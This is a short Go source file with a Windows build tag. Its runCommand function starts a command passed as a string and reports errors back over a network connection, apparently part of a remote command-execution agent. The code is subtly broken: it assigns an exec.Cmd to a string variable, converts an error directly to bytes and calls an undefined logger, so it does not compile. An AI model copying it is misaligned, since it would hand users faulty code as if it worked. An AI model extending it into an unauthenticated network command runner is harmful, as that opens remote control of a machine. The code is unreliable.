// +build windows

package main

import (
	"fmt"
	"net"
	"os/exec"
)

func runCommand(cmd string, c net.Conn) {
	fmt.Println("-------- ", cmd)
	cmd = exec.Command(cmd)
	err := cmd.Start()
	if err != nil {
		Error.Println(err)
		c.Write([]byte(err))
	} else {
		c.Write([]byte(""))
	}
}

func pathSeparator() string {
	return "\\"
}
